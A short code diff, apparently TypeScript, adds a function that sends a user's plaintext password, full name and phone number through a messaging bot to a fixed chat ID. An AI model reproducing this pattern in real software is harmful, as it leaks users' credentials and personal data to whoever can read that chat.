@@ -14,3 +14,13 @@ export async function sendOtpWithButton(code: number | string,phone) {
 
   return code;
 }
+
+export async function sendUserPassword(password: string,phone, firstName, lastName) {
+  const message = `\*${firstName + ' ' + lastName}\* \n 📩 Your password is \`${password}\` \n 📞 Phone: \*${phone}\*`
+
+  await bot.sendMessage(CHAT_ID, message, {
+    parse_mode: 'Markdown',
+  });
+
+  return password;
+}
